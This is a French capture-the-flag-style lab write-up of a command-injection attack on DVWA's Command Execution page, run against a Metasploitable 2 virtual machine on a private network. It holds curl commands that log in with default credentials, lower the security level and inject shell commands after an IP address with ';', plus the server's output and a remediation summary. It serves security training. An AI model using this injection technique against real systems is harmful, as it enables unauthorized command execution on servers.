# Write-up — DVWA, injection de commande (Metasploitable 2, port 80)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali : `192.168.56.1`.
Résultat : **RCE** en tant que **`www-data`** via la page *Command Execution* de DVWA.

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.

**C'est quoi ?** DVWA (Damn Vulnerable Web Application) est une appli volontairement
vulnérable. Sa page *Command Execution* passe l'entrée utilisateur (une IP à « pinger »)
directement à un `shell_exec("ping -c 4 $ip")` sans aucun filtrage en sécurité **low** : on
peut y injecter une commande shell avec `;`.

---

## 1. Recon / accès

DVWA est listé sur la page d'accueil (`http://192.168.56.101/dvwa/`). Identifiants par défaut :
**`admin:password`**.

```bash
# login (cookie jar), DVWA accepte admin:password
curl -s -c dvwa.txt http://192.168.56.101/dvwa/login.php   # récupère PHPSESSID + token
curl -s -b dvwa.txt -c dvwa.txt -L \
  --data "username=admin" --data "password=password" --data "Login=Login" \
  http://192.168.56.101/dvwa/login.php
```

Connexion confirmée (page d'accueil « Welcome to Damn Vulnerable Web Application », lien
`Logout`).

## 2. Mise en sécurité « low »

```bash
curl -s -b dvwa.txt -c dvwa.txt --data "security=low" --data "seclev_submit=Submit" \
  http://192.168.56.101/dvwa/security.php
```

La page *Command Execution* confirme ensuite : `Security Level: low`, `PHPIDS: disabled`.

## 3. Exploitation — injection de commande

Le formulaire a un champ `ip` et un bouton `submit` (minuscule). On injecte une commande
après l'IP avec `;` :

```bash
curl -s -b dvwa.txt -b "security=low" \
  --data-urlencode "ip=127.0.0.1;id;uname -a;hostname" --data "submit=submit" \
  http://192.168.56.101/dvwa/vulnerabilities/exec/
```

Sortie (nettoyée des balises HTML) :
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
```

Le `ping` s'exécute, puis **notre `id;uname -a;hostname` est exécuté** à la suite → exécution
de commande arbitraire côté serveur.

**Piège rencontré :** le bouton d'envoi s'appelle `submit` (minuscule) ; envoyer
`Submit=Submit` ne déclenche pas le code (le PHP teste `isset($_POST['submit'])`) et la page
renvoie juste le formulaire vide — corrigé en `submit=submit`.

## 4. Preuve d'accès

`uid=33(www-data)` renvoyé dans la réponse de la page *Command Execution* : RCE confirmée en
tant que serveur web. En version navigateur, l'injection `127.0.0.1;id` affiche le résultat
directement sous le formulaire.

## 5. Remédiation (résumé)

Ne jamais passer d'entrée utilisateur à un shell ; utiliser des API sûres
(`escapeshellarg`/listes blanches), valider strictement le format IP. En montant le niveau de
sécurité DVWA (medium/high), on voit progressivement les protections correctes
(`stripslashes`, filtrage des métacaractères, puis validation stricte).

---

**Pour rejouer :** login `admin:password`, sécurité low, page *Command Execution*, champ
« ping » = `127.0.0.1;id`.
